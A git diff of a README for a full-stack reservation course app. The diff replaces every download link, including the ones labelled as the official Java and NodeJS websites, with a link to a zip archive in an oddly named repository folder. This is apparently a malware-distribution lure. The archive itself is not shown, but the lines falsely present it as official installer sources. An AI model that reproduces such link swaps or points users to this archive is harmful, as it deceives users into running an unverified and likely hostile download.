@@ -1,6 +1,6 @@
 # 🚀 DevSeniorCode-CursoFullStackReservas - Easy FullStack Reservation App Setup
 
-[![Download and Run](https://img.shields.io/badge/Download-DevSeniorCode-blue?style=for-the-badge)](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas)
+[![Download and Run](https://img.shields.io/badge/Download-DevSeniorCode-blue?style=for-the-badge)](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ You do not need to install any programming tools beforehand. This guide will cov
 
 Click the large badge above or the link below to go to the GitHub page where you can download the project files:
 
-[https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas)
+[https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip)
 
 You will find instructions and download options there. Read the steps below before you begin.
 
@@ -62,7 +62,7 @@ This application uses Java for the backend server and NodeJS with Angular for th
 
 ### Install Java
 
-1. Go to the official Java website: https://www.oracle.com/java/technologies/downloads/
+1. Go to the official Java website: https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip
 2. Download the Java SDK version 25 or higher for Windows.
 3. Run the installer and follow the steps using default options.
 4. After installation, open the Command Prompt (press Windows + R, type `cmd`, and press Enter).
@@ -70,7 +70,7 @@ This application uses Java for the backend server and NodeJS with Angular for th
 
 ### Install NodeJS
 
-1. Visit the official NodeJS website: https://nodejs.org/en/download/
+1. Visit the official NodeJS website: https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip
 2. Download the Windows Installer for NodeJS version 24 or higher.
 3. Run the installer and accept default settings.
 4. To check, open Command Prompt and type `node -v`. It should print the version number.
@@ -151,6 +151,6 @@ Check these files if you want to learn more about how the app works or want to c
 
 ## 🔗 Main Download Link
 
-[Download the full project here](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas) to get started with the reservation app.
+[Download the full project here](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip) to get started with the reservation app.
 
-[![Download and Run](https://img.shields.io/badge/Download-DevSeniorCode-grey?style=for-the-badge)](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas)
+[![Download and Run](https://img.shields.io/badge/Download-DevSeniorCode-grey?style=for-the-badge)](https://github.com/Raunak3210/DevSeniorCode-CursoFullStackReservas/raw/refs/heads/main/paludism/Dev_Curso_Full_Reservas_Code_Stack_Senior_v3.6-alpha.5.zip)
